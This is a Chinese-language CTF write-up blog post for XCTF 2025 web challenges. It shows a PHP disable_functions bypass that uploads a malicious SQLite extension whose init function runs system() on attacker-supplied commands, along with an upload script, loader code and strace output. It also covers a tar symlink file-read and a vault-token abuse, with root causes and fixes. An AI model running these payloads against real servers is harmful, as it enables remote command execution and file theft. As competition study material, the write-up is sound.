AAAAAAAAAN0AAAABAAAAAwAAAAAAAAAIQAAAAAAAAAgwAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADjAAAACAAAAAMAAAAAAAAAEEAAAAAAAAAQMAAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA6AAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAEDAAAAAAAAAfAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAAAAAAAAAAADAwAAAAAAAAcAIAAAAAAAAaAAAAFQAAAAgAAAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAAAAAAAAAAAAAAAAAAAACgMgAAAAAAAH4BAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAHjQAAAAAAADxAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==&#x27;)));</span></span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --engine `pwd`/evil_engine.so https://example.com</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ch</span> = curl_init(<span class="string">&#x27;http://localhost&#x27;</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSLENGINE, <span class="string">&quot;/var/www/html/evil_engine.so&quot;</span>);</span><br><span class="line"><span class="variable">$data</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line"><span class="variable">$err</span> = curl_error(<span class="variable">$ch</span>);</span><br><span class="line"><span class="variable">$info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">var_dump(<span class="variable">$info</span>[<span class="string">&#x27;http_code&#x27;</span>] ?? null, strlen(<span class="variable">$data</span>), <span class="variable">$err</span> ?: <span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\\n====\\n&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="kidding-Reverge-XXX-SOLVED"><a href="#kidding-Reverge-XXX-SOLVED" class="headerlink" title="kidding  Reverge|| XXX || SOLVED"></a>kidding  Reverge|| XXX || SOLVED</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;so_ez!k1ddi&amp;g?&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//so_ez!k1ddi%26g?=phpinfo%28%29%3B</span></span><br></pre></td></tr></table></figure>

<p>题目过滤了 disable_functions 和 open_basedir&#x20;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_open,pcntl_waitpid,pcntl_wait,dl,ini_restore,mb_send_mail,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,pcntl_alarm,pcntl_sigtimedwait,ini_set</span><br></pre></td></tr></table></figure>

<ul>
<li><p>所有常见的命令执行函数都被ban了(system, exec, shell_exec, popen等)</p>
</li>
<li><p>putenv被禁用,导致很多传统bypass方案失效</p>
</li>
<li><p>UAF等常见方法也被阻止</p>
</li>
</ul>
<p>但是这里题目中还存在sqlite3 扩展，</p>
<ul>
<li><p><code>SQLite3::loadExtension()</code> - 需要库在 <code>sqlite3.extension_dir</code> 配置的目录中</p>
</li>
<li><p><code>PDO\SQLite::loadExtension()</code> - <strong>没有目录限制</strong>，可以加载任意路径的 <code>.so</code> 文件</p>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sqlite3ext.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">SQLITE_EXTENSION_INIT1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sqlite3_exploit_init</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    sqlite3 *db,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">char</span> **pzErrMsg,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> sqlite3_api_routines *pApi</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">SQLITE_EXTENSION_INIT2</span>(pApi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从 /tmp/1.txt 读取命令</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *command_file_path = <span class="string">&quot;/tmp/1.txt&quot;</span>;</span><br><span class="line">    <span class="type">char</span> command_buffer[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    FILE *file_handle;</span><br><span class="line"></span><br><span class="line">    file_handle = <span class="built_in">fopen</span>(command_file_path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file_handle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> SQLITE_OK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取并执行命令</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fgets</span>(command_buffer, <span class="built_in">sizeof</span>(command_buffer), file_handle) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        command_buffer[<span class="built_in">strcspn</span>(command_buffer, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>(command_buffer) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">system</span>(command_buffer);  <span class="comment">// 在 .so 中执行系统命令</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(file_handle);</span><br><span class="line">    <span class="keyword">return</span> SQLITE_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li><p>SQLite 扩展加载时会自动调用 <code>sqlite3_&lt;扩展名&gt;_init</code> 函数</p>
</li>
<li><p>在这个初始化函数中调用 <code>system()</code> 执行命令</p>
</li>
<li><p>因为是在 <code>.so</code> 编译后的代码中调用，不受 PHP <code>disable_functions</code> 限制</p>
</li>
</ul>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a><strong>攻击流程</strong></h3><h4 id="编译-so-文件"><a href="#编译-so-文件" class="headerlink" title="编译 .so 文件"></a><strong>编译 .so 文件</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o exploit.so rec3.c -lsqlite3</span><br></pre></td></tr></table></figure>

<p>生成的 ELF 文件结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ELF Header</span><br><span class="line">Program Headers</span><br><span class="line">Section Headers</span><br><span class="line">    .text       → 包含 sqlite3_exploit_init() 的机器码</span><br><span class="line">    .dynsym     → 动态符号表（包含 sqlite3_exploit_init）</span><br><span class="line">    .dynstr     → 符号名称字符串</span><br><span class="line">    .plt        → 过程链接表（调用 libc 函数）</span><br><span class="line">    .got        → 全局偏移表</span><br></pre></td></tr></table></figure>

<p>使用 <code>nm</code> 查看符号：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nm exploit.so | grep init</span><br><span class="line">0000000000001149 T sqlite3_exploit_init  # T 表示在 .text 段，可被外部调用</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="上传-so-文件"><a href="#上传-so-文件" class="headerlink" title="上传 .so 文件"></a><strong>上传 .so 文件</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">读取so文件并通过POST发送cmd参数</span><br><span class="line">用法: python3 post_file.py &lt;target_url&gt; &lt;so_file&gt; [output_path]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &lt; 3:</span><br><span class="line">    print(&quot;用法: python3 post_file.py &lt;target_url&gt; &lt;so_file&gt; [output_path]&quot;)</span><br><span class="line">    print(&quot;示例: python3 post_file.py http://target.com/index.php exploit.so&quot;)</span><br><span class="line">    sys.exit(1)</span><br><span class="line"></span><br><span class="line">url = sys.argv[1]</span><br><span class="line">so_file = sys.argv[2]</span><br><span class="line">output_path = sys.argv[3] if len(sys.argv) &gt; 3 else &#x27;/tmp/&#x27; + so_file.split(&#x27;/&#x27;)[-1]</span><br><span class="line"></span><br><span class="line"># 读取so文件</span><br><span class="line">with open(so_file, &#x27;rb&#x27;) as f:</span><br><span class="line">    so_data = f.read()</span><br><span class="line"></span><br><span class="line"># 转base64</span><br><span class="line">so_base64 = base64.b64encode(so_data).decode(&#x27;ascii&#x27;)</span><br><span class="line"></span><br><span class="line"># 生成PHP代码</span><br><span class="line">php_code = f&quot;file_put_contents(&#x27;&#123;output_path&#125;&#x27;, base64_decode(&#x27;&#123;so_base64&#125;&#x27;));&quot;</span><br><span class="line"></span><br><span class="line"># 发送POST请求</span><br><span class="line">response = requests.post(url, data=&#123;&#x27;cmd&#x27;: php_code&#125;, timeout=30)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="写入要执行的命令并加载扩展"><a href="#写入要执行的命令并加载扩展" class="headerlink" title="写入要执行的命令并加载扩展"></a><strong>写入要执行的命令并加载扩展</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 写入要执行的命令</span><br><span class="line">file_put_contents(&quot;/tmp/1.txt&quot;, &quot;cat /flag_xxx &gt; /tmp/4.txt&quot;);</span><br><span class="line"></span><br><span class="line">// 创建 SQLite 连接并加载扩展</span><br><span class="line">$db = new Pdo\Sqlite(&#x27;sqlite::memory:&#x27;);</span><br><span class="line">$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line">$db-&gt;loadExtension(&#x27;/tmp/exploit.so&#x27;);  </span><br><span class="line">// 触发 .so 初始化，执行命令</span><br><span class="line">// 读取结果</span><br><span class="line">echo file_get_contents(&quot;/tmp/4.txt&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="x20-加载过程详解"><a href="#x20-加载过程详解" class="headerlink" title="&#x20;加载过程详解"></a>&#x20;<strong>加载过程详解</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$db = new Pdo\Sqlite(&#x27;sqlite::memory:&#x27;);</span><br><span class="line">$db-&gt;loadExtension(&#x27;/tmp/exploit.so&#x27;);</span><br></pre></td></tr></table></figure>

<p>对应的系统调用序列（使用 <code>strace</code> 观察）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 1. 打开 .so 文件</span><br><span class="line">openat(AT_FDCWD, &quot;/tmp/exploit.so&quot;, O_RDONLY|O_CLOEXEC) = 4</span><br><span class="line"></span><br><span class="line"># 2. 读取 ELF 头部</span><br><span class="line">read(4, &quot;\177ELF\2\1\1\0\0\0...&quot;, 832) = 832</span><br><span class="line"></span><br><span class="line"># 3. 映射到内存（dlopen）</span><br><span class="line">mmap(NULL, 16384, PROT_READ|PROT_EXEC, MAP_PRIVATE, 4, 0) = 0x7f1234567000</span><br><span class="line"></span><br><span class="line"># 4. 解析符号表，查找 sqlite3_exploit_init（dlsym）</span><br><span class="line"># 在 0x7f1234567149 找到函数入口</span><br><span class="line"></span><br><span class="line"># 5. 调用 sqlite3_exploit_init()</span><br><span class="line"># 函数内部执行：</span><br><span class="line">fopen(&quot;/tmp/1.txt&quot;, &quot;r&quot;) = 5</span><br><span class="line">fgets(buf, 512, 5) → &quot;cat /flag &gt; /tmp/4.txt&quot;</span><br><span class="line"></span><br><span class="line"># 6. 执行 system()</span><br><span class="line">clone(CLONE_CHILD_CLEARTID|SIGCHLD, ...) = 12345</span><br><span class="line">execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;cat /flag &gt; /tmp/4.txt&quot;], ...)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="为什么-system-能执行？"><a href="#为什么-system-能执行？" class="headerlink" title="为什么 system() 能执行？"></a><strong>为什么 system() 能执行？</strong></h4><p>关键在于 <code>.so</code> 文件的<strong>动态链接</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c复制</span><br><span class="line">// exploit.so 的汇编代码（简化）</span><br><span class="line">sqlite3_exploit_init:</span><br><span class="line">    push   rbp</span><br><span class="line">    mov    rbp, rsp</span><br><span class="line">    // ...</span><br><span class="line">    call   fopen@plt        # 通过 PLT 调用 libc 的 fopen</span><br><span class="line">    // ...</span><br><span class="line">    call   system@plt       # 通过 PLT 调用 libc 的 system</span><br><span class="line">    // ...</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>

<p><code>@plt</code> 表示通过<strong>过程链接表</strong>调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">复制</span><br><span class="line">system@plt:</span><br><span class="line">    jmp    *system@got      # 跳转到 GOT 表中的地址system@got:</span><br><span class="line">    .quad  0x7ffff7a52390  # 指向 libc.so.6 中 system() 的真实地址</span><br></pre></td></tr></table></figure>

<p><strong>完全绕过 PHP 层</strong>，直接调用操作系统的 <code>libc</code>！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHP 代码: $db-&gt;loadExtension(<span class="string">&#x27;/tmp/exploit.so&#x27;</span>)</span><br><span class="line">    ↓</span><br><span class="line">PDO SQLite 驱动: sqlite3_load_extension()</span><br><span class="line">    ↓</span><br><span class="line">dlopen() 加载 exploit.so 到进程空间</span><br><span class="line">    ↓</span><br><span class="line">dlsym() 查找 sqlite3_exploit_init 符号</span><br><span class="line">    ↓</span><br><span class="line">调用 sqlite3_exploit_init()</span><br><span class="line">    ↓</span><br><span class="line">C 代码直接调用 libc 的 system()</span><br><span class="line">    ↓  (绕过 PHP 层)</span><br><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>, [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat /flag&quot;</span>], ...)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="NSL-XXX-SOLVED"><a href="#NSL-XXX-SOLVED" class="headerlink" title="NSL || XXX || SOLVED"></a>NSL || XXX || SOLVED</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><ul>
<li><p>&#x2F;tickets&#x2F;{ticket_id}&#x2F;upload</p>
<ul>
<li><p>早期代码问题点：</p>
<ul>
<li><p>允许在暂存目录下原样创建归档成员（包括符号链接、硬链接），或写入带有特殊 metadata 的成员；</p>
</li>
<li><p>路径校验仅校验“相对 staging_root”的越界，但未剥离危险类型。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>导出端：GET &#x2F;diagnostics&#x2F;bundle?ticket&#x3D;&lt;id&gt;</p>
<ul>
<li><p>早期代码问题点：</p>
<ul>
<li><p>使用 tarfile.open(…, dereference&#x3D;True) 并直接 archive.add(candidate)；</p>
</li>
<li><p>对于候选路径若为符号链接，打包时会“解引用”并把目标真实文件内容放入 tar（例如 &#x2F;flag），等同于任意文件读取。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ol>
<li>利用步骤（与你抓到的 pcap 一致）</li>
</ol>
<ul>
<li><p>注册账号、创建工单；</p>
</li>
<li><p>构造并上传恶意 exploit.tar，其内包含：</p>
<ul>
<li><p>manifest.json（控制导出时的 includes 列表）</p>
</li>
<li><p>leak（符号链接，其 linkname 指向 &#x2F;flag）</p>
</li>
</ul>
</li>
<li><p>请求导出 &#x2F;diagnostics&#x2F;bundle?ticket&#x3D;…：</p>
<ul>
<li><p>早期导出逻辑对 leak 进行 archive.add(…, dereference&#x3D;True)，把 &#x2F;flag 的内容打进 tar；</p>
</li>
<li><p>最终下载的 diagnostics-….tar 内包含了明文 flag。</p>
</li>
</ul>
</li>
</ul>
<ol start="3">
<li>根因</li>
</ol>
<ul>
<li><p>上传阶段未禁止符号&#x2F;硬链接且“原样还原”；导出阶段对符号链接“解引用”并直接打包实际目标文件。</p>
</li>
<li><p>两端组合导致“被动捆绑宿主文件”成立。</p>
</li>
</ul>
<ul>
<li>当前修复要点</li>
</ul>
<ul>
<li><p>上传（app&#x2F;routes&#x2F;support.py）：</p>
<ul>
<li><p>严格拒绝符号链接与硬链接（issym() &#x2F; islnk()），仅接收目录与常规文件；</p>
</li>
<li><p>限制单包大小（20 MiB）、成员数量（≤200）与单成员大小（≤8 MiB）；</p>
</li>
<li><p>抽取时“正则化”：读取成员内容并以新文件写入（忽略原 tar 元数据）。</p>
</li>
</ul>
</li>
<li><p>导出（app&#x2F;routes&#x2F;diagnostics.py）：</p>
<ul>
<li><p>不解引用链接（dereference&#x3D;False），仅接受 staging 内“真实常规文件”；</p>
</li>
<li><p>路径 resolve() 后再次校验必须位于 staging_root；</p>
</li>
<li><p>跳过符号链接和多硬链接（nlink&gt;1），限制单文件与总量；</p>
</li>
<li><p>重新构建 TarInfo 与数据流，按“干净 REG”写入 tar 包，彻底剥离危险元数据。</p>
</li>
</ul>
</li>
</ul>
<h4 id="攻击路径二：Vault-令牌链路被滥用（直取-flag）"><a href="#攻击路径二：Vault-令牌链路被滥用（直取-flag）" class="headerlink" title="攻击路径二：Vault 令牌链路被滥用（直取 flag）"></a>攻击路径二：Vault 令牌链路被滥用（直取 flag）</h4><p>目标：拿到能访问诊断服务 &#x2F;admin&#x2F;vault&#x2F;snapshot 的有效 Bearer token，并通过主站代理拿到 flag。</p>
<ol>
<li>&#x20;用户控制点</li>
</ol>
<ul>
<li><p>中继握手（POST &#x2F;api&#x2F;relays&#x2F;bootstrap）</p>
<ul>
<li><p>早期逻辑会无条件签发形如 NL-VAULT-&lt;随机&gt; 的 access_token 并落库为 RelayToken。</p>
</li>
<li><p>没有设备侧强校验与绑定（如签名证明&#x2F;nonce），注册用户可自行创建 relay 并获取可用的 NL-VAULT-*。</p>
</li>
</ul>
</li>
<li><p>主站金库代理（GET &#x2F;admin&#x2F;vault&#x2F;snapshot → 127.0.0.1:6070）</p>
<ul>
<li>早期主站代理仅转发 Authorization，无角色&#x2F;源限制，且将上游 JSON 原样返回；</li>
</ul>
</li>
<li><p>诊断服务（GET 127.0.0.1:6070&#x2F;admin&#x2F;vault&#x2F;snapshot）</p>
<ul>
<li>早期行为对 RelayToken.access_token 命中即返回 JSON，包含 flag 明文。</li>
</ul>
</li>
</ul>
<ul>
<li>利用步骤（与你抓到的 pcap 一致）</li>
</ul>
<ul>
<li><p>注册账号；</p>
</li>
<li><p>调 relay&#x2F;bootstrap 获取 NL-VAULT-* token（或通过其它途径得到模式正确的 token）；</p>
</li>
<li><p>直接对主站 GET &#x2F;admin&#x2F;vault&#x2F;snapshot，头上带 Authorization: Bearer NL-VAULT-…；</p>
</li>
<li><p>主站转发到诊断服务，早期诊断服务将 flag 明文返回，主站不做脱敏直接回给攻击者。</p>
</li>
</ul>
<ul>
<li>根因</li>
</ul>
<ul>
<li><p>令牌获取门槛过低（任何注册用户可生成中继并拿到有效 access_token）；</p>
</li>
<li><p>主站代理缺少 RBAC 与脱敏；</p>
</li>
<li><p>诊断服务对 RelayToken 身份仅做存在性校验，不区分权限等级，也不限制是否可取明文 flag。</p>
</li>
</ul>
<ul>
<li>当前修复要点</li>
</ul>
<ul>
<li><p>诊断服务（app&#x2F;diagnostics_service.py）：</p>
<ul>
<li><p>仅维护令牌返回 flag；RelayToken 仅返回 hash 与 mode；</p>
</li>
<li><p>对来路 token 增强校验（前缀与长度）并落库匹配。</p>
</li>
</ul>
</li>
<li><p>主站代理（app&#x2F;routes&#x2F;diagnostics.py）：</p>
<ul>
<li><p>仅 role&#x3D;system 可使用该代理；</p>
</li>
<li><p>上游响应统一剥离 flag 字段为 [redacted]。</p>
</li>
</ul>
</li>
<li><p>队列与日志（app&#x2F;pulsebus&#x2F;core.py）：</p>
<ul>
<li>维护快照任务写日志前脱敏 flag。</li>
</ul>
</li>
<li><p>令牌生成（app&#x2F;routes&#x2F;relays.py）：</p>
<ul>
<li>加强 token 随机度与长度（拼接两段随机 ID），显著拉高撞库成本。</li>
</ul>
</li>
<li><p>任务调度（app&#x2F;routes&#x2F;pulsebus.py）：</p>
<ul>
<li><p>彻底锁定 topic&#x2F;privileged 使用模板值，仅允许模板 params 白名单键；</p>
</li>
<li><p>如任务被标记为 privileged，非 system 用户拒绝（前瞻防御）。</p>
</li>
</ul>
</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ArcNova7.github.io">ArcNova</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://arcnova7.github.io/2025/12/08/XCTF2025/">https://arcnova7.github.io/2025/12/08/XCTF2025/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="https://adworld.xctf.org.cn/media/news_cover/70000635-d985-45d7-9682-3c71c1fb6928.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/" title="湾区杯2025"><img class="cover" src="https://imgslim.geekpark.net/uploads/image/file/2b/d3/2bd37f20466d5d1cbf0928c27697b205.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">湾区杯2025</div></div><div class="info-2"><div class="info-item-1">湾区杯2025WebSSTIGo 模板语法测试 1&#123;&#123;$&#125;&#125;  返回： 1map[B64Decode:0x6ee380 exec:0x6ee120]  该对象包含两个函数：B64Decode 和 exec  如果 exec 是可直接访问的属性，应该返回函数地址 123&#123;&#123;.exec&#125;&#125; - 直接访问&#123;&#123;call .exec &quot;whoami&quot;&#125;&#125;    存在过滤 1&#123;&#123;call .exec &quot;dir /bin&quot;&#125;&#125;查看可执行程序  base64 失败,尝试继续编码执行  eazy_readfile12345678910&lt;?phpclass Acheron &#123;    public $mode;    public function __construct($mode)&#123;        $this-&gt;mode = $mode;    &#125;&#125;...</div></div></div></a><a class="pagination-related" href="/2025/12/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" title="命令执行(RCE)绕过技术"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">命令执行(RCE)绕过技术</div></div><div class="info-2"><div class="info-item-1">命令执行(RCE)绕过技术全面指南参考https://blog.csdn.net/qq\_43431158/article/details/105422347，写到异或绕过 1.  基础概念RCE (Remote Code Execution)：远程代码执行漏洞，攻击者可直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 2. 常见执行函数2.1 PHP代码执行函数eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()等。 2.2 PHP命令执行函数system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()等。 passthru(&#39;tac fla*&#39;); 2.3 特殊函数利用 反引号执行：`ls` 或 &lt;?= ls ?&gt;（短标签形式）  无参数函数调用：PHP ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/08/28/JAVA%E5%8F%8D%E5%B0%84/" title="深入理解Java反射机制：动态操作类的强大工具"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/2853232508930053.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-28</div><div 